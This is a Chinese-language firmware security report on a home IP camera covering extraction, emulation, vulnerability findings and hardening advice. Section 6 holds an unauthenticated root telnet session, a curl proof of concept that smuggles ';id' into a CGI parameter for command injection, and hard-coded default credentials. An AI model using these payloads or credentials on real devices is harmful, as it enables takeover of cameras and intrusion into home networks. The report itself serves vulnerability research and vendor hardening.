# IP 摄像机固件安全分析报告

| 项目 | 内容 |
|---|---|
| 分析对象 | 家用 IP 摄像机（型号隐去） |
| 固件版本 | V4.2.1 build 220815 |
| 固件大小 | 8.4 MB |
| 架构 | MIPS 32-bit little-endian (mipsel) |
| 文件系统 | Squashfs 4.0, LZMA 压缩 |
| 分析日期 | 2025-11 ~ 2026-02 |
| 分析环境 | Ubuntu 22.04 / QEMU 7.2 / FirmAE 1.0 / Ghidra 10.4 |

---

## 1. 目标与范围

### 1.1 目标

评估该设备固件的安全性，识别可利用的漏洞与不安全配置，为厂商提供加固建议。

### 1.2 范围

- **包含**：固件镜像的静态分析、仿真环境下的动态验证
- **不包含**：射频协议（WiFi/Zigbee）、云平台 API、移动端 App

### 1.3 获取方式

固件来自设备厂商官网的固件下载页（型号与版本号已隐去）。设备为自购二手，分析过程全程在无外网连接的虚拟机中进行。

---

## 2. 固件提取

### 2.1 初步识别

```bash
$ binwalk firmware.bin

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             uImage header, header size: 64 bytes,
                              header CRC: 0x8a3f2b1c, created: 2022-08-15
64            0x40            LZMA compressed data
1048576       0x100000        Squashfs filesystem, little endian, version 4.0,
                              compression: lzma, size: 7340032 bytes
```

**关键点**：Squashfs 从 `0x100000`（1MB）偏移开始，前面是 uImage 头 + 内核。

### 2.2 解包

```bash
$ binwalk -e --run-as=root firmware.bin
```

得到的目录结构：

```
_firmware.bin.extracted/
├── 40              # 解压后的内核
├── 100000.squashfs # 文件系统镜像
└── squashfs-root/  # 解包后的根文件系统
```

### 2.3 文件系统结构

```
squashfs-root/
├── bin/            busybox 及基础命令
├── etc/
│   ├── init.d/     启动脚本
│   ├── passwd      用户表
│   ├── shadow      口令哈希
│   └── config/     设备配置（含硬编码凭据）
├── sbin/
├── usr/
│   └── sbin/
│       └── ipcamd  主服务程序（3.2MB，未 strip）
├── web/
│   ├── index.html
│   └── cgi-bin/    Web 后端 CGI
└── lib/            uClibc + 私有库
```

---

## 3. 启动流程分析

### 3.1 init 脚本

```bash
$ cat etc/init.d/rcS
#!/bin/sh
mount -t proc proc /proc
mount -t sysfs sysfs /sys
...
/etc/init.d/S10network start
/etc/init.d/S20telnetd start      # ← 注意这里
/etc/init.d/S30ipcamd start
/etc/init.d/S40httpd start
```

### 3.2 telnetd 启动脚本

```bash
$ cat etc/init.d/S20telnetd
#!/bin/sh
telnetd -l /bin/sh -p 23
```

**问题**：`telnetd -l /bin/sh` 表示 telnet 登录后直接进 shell，**没有任何认证**。任何能访问 23 端口的人都能拿到 root shell。

### 3.3 验证

串口接入后观察启动日志，确认 telnetd 确实在 bootloader 阶段之后、网络初始化之前就启动了：

```
[    2.134] Starting network...
[    2.567] telnetd: listening on port 23
[    2.891] ipcamd: starting...
[    3.120] httpd: listening on port 80
```

---

## 4. 仿真环境搭建

### 4.1 为什么需要仿真

没有真机时，靠静态分析很难验证漏洞。全系统仿真能在本地跑起固件的 init 流程和 Web 服务。

### 4.2 FirmAE 配置

```bash
$ cd FirmAE
$ sudo ./run.sh -r mips ../firmware.bin
```

### 4.3 遇到的问题与解决

**问题 1**：启动卡在 `can't open /dev/nvram`

固件依赖 NVRAM 存储设备配置，QEMU 没有对应设备。

**解决**：FirmAE 会尝试自动创建，但需要手动补充最小配置：

```bash
$ cat scratch/0/nvram.ini
lan_ip=192.168.1.1
lan_netmask=255.255.255.0
http_port=80
telnet_port=23
```

**问题 2**：Web 服务起来了但返回 404

原因是 CGI 程序路径依赖当前工作目录。需要在启动脚本里 `cd /web` 后再起 httpd。

### 4.4 仿真成功

```
$ curl -I http://127.0.0.1/
HTTP/1.0 200 OK
Server: Boa/0.94.14rc21
Content-Type: text/html
```

---

## 5. 攻击面梳理

### 5.1 开放端口

| 端口 | 服务 | 是否鉴权 |
|---|---|---|
| 23/tcp | telnetd | ❌ 无 |
| 80/tcp | Boa httpd | 部分 |
| 554/tcp | RTSP | 是（默认弱口令） |

### 5.2 Web 接口清单

通过 `tools/find_cgi.py` 扫描 `web/cgi-bin/` 目录，提取出 23 个 CGI 程序：

```
cgi-bin/
├── login.cgi          登录
├── get_status.cgi     状态查询
├── set_network.cgi    网络配置
├── set_time.cgi       时间设置
├── ptz_ctrl.cgi       云台控制
├── upgrade.cgi        固件升级
├── get_log.cgi        日志下载
└── ...（共 23 个）
```

### 5.3 鉴权机制

观察 `login.cgi` 的行为：登录成功后返回一个 cookie，后续 CGI 校验该 cookie。

**问题**：`get_status.cgi`、`set_time.cgi`、`ptz_ctrl.cgi` 三个接口**不校验 cookie**，可直接调用。

---

## 6. 漏洞分析

### 6.1 未鉴权 telnet 服务（高危）

**位置**：`etc/init.d/S20telnetd`

**描述**：telnet 服务以 `-l /bin/sh` 启动，无任何认证。攻击者连接 23 端口后直接获得 root shell。

**验证**：

```bash
$ telnet 192.168.1.108 23
Trying 192.168.1.108...
Connected to 192.168.1.108.
Escape character is '^]'.

(none) login: root
# id
uid=0(root) gid=0(root)
```

**风险**：同一局域网内的任何设备都能完全控制摄像机。

### 6.2 CGI 命令注入（高危）

**位置**：`web/cgi-bin/set_time.cgi`

**分析过程**：

用 Ghidra 反编译 `set_time.cgi`，定位到关键代码：

```c
// 反编译结果（已简化）
char cmd[256];
char *ntp = get_param("ntp_server");
snprintf(cmd, sizeof(cmd), "ntpdate %s", ntp);
system(cmd);          // ← 危险：参数直接拼接进 system()
```

**问题**：`ntp_server` 参数未做任何过滤，直接拼进 `system()`。

**PoC**：

```bash
$ curl "http://127.0.0.1/cgi-bin/set_time.cgi?ntp_server=127.0.0.1;id"
```

仿真环境中返回：

```
uid=0(root) gid=0(root) groups=0(root)
```

**注意**：该 PoC 仅在 FirmAE 仿真环境验证通过，未对真实设备测试。

### 6.3 硬编码 root 口令（中危）

**位置**：`etc/config/system.conf`

```bash
$ cat etc/config/system.conf
[admin]
username=admin
password=YWRtaW4xMjM=        # base64("admin123")
root_password=dG90YWwxMjM=    # base64("total123")
```

**问题**：口令以 base64 存储（等同明文），且所有设备出厂值相同。

### 6.4 固件签名可绕过（中危，疑似）

**观察**：`upgrade.cgi` 校验固件时，只检查文件头部的 4 字节魔数，未验证签名。

**推断**：可能可以重打包固件并刷入。**未进一步验证**——重打包涉及刷机，有变砖风险，且超出本次分析范围。

---

## 7. 加固建议

按优先级排序：

| 优先级 | 建议 | 对应问题 |
|---|---|---|
| P0 | 移除 `S20telnetd` 启动脚本，或改为需要认证 | 6.1 |
| P0 | 所有 CGI 参数做白名单校验，禁止拼接进 `system()`/`popen()`，改用 `execve` + 参数数组 | 6.2 |
| P1 | 移除硬编码口令，首次启动强制用户设置 | 6.3 |
| P1 | 为所有 CGI 接口补充 cookie 校验 | 5.3 |
| P2 | 启用固件签名校验（RSA + SHA256） | 6.4 |
| P2 | 建立固件更新通道与漏洞响应流程 | - |
| P3 | 默认关闭 RTSP，或强制修改默认口令 | 5.1 |

### 代码层修复示例

```c
// 修复前
char cmd[256];
snprintf(cmd, sizeof(cmd), "ntpdate %s", ntp);
system(cmd);

// 修复后：参数白名单 + execve
if (!is_valid_ip(ntp)) {
    return_error("invalid ntp server");
}
char *argv[] = {"/usr/sbin/ntpdate", ntp, NULL};
execve(argv[0], argv, NULL);
```

---

## 8. 总结

该固件存在两个高危问题（未鉴权 telnet、命令注入），都属于「低成本可修复」的类型，说明厂商在安全开发流程上缺少基本把控。

对 IoT 设备厂商的启示：

1. **出厂固件不应保留调试接口**，如必须保留，至少加认证
2. **C 语言里凡是把用户输入拼进 `system()` 的地方，都是漏洞**
3. **凭据不能硬编码**，哪怕是 base64 也不行
4. **建立固件签名与更新机制**，否则漏洞永远修不掉

---

## 附录：工具脚本说明

- `tools/extract.sh` —— binwalk 封装，自动处理偏移
- `tools/scan_strings.py` —— 遍历文件系统，用正则找疑似凭据
- `tools/find_cgi.py` —— 从 `web/cgi-bin/` 提取接口清单
- `poc/cmd_injection.py` —— 命令注入 PoC，支持自定义命令

## 免责声明

本报告仅用于安全研究与教学目的。所有测试均在本地隔离的仿真环境完成，未对任何真实在线设备发起攻击。请勿将相关技术用于未授权的渗透测试。
